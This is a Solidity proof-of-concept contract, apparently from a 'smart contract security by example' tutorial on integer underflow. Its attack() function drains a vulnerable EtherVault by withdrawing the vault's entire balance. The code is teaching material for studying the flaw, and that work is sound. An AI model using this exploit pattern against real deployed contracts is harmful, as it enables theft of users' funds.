// SPDX-License-Identifier: BSL-1.0 (Boost Software License 1.0)

//-------------------------------------------------------------------------------------//
// Copyright (c) 2022 - 2023 serial-coder: Phuwanai Thummavet (mr.thummavet@gmail.com) //
//-------------------------------------------------------------------------------------//

// For more info, please refer to my article:
//  - On Medium: https://medium.com/valixconsulting/solidity-smart-contract-security-by-example-01-integer-underflow-c1147c2e507b
//  - On serial-coder.com: https://www.serial-coder.com/post/solidity-smart-contract-security-by-example-01-integer-underflow/

pragma solidity 0.6.12;

interface IEtherVault {
    function withdraw(uint256 _amount) external;
    function getEtherBalance() external view returns (uint256);
}

contract Attack {
    IEtherVault public immutable etherVault;

    constructor(IEtherVault _etherVault) public {
        etherVault = _etherVault;
    }

    receive() external payable {}

    function attack() external {
        etherVault.withdraw(etherVault.getEtherBalance());
    }

    function getEtherBalance() external view returns (uint256) {
        return address(this).balance;
    }
}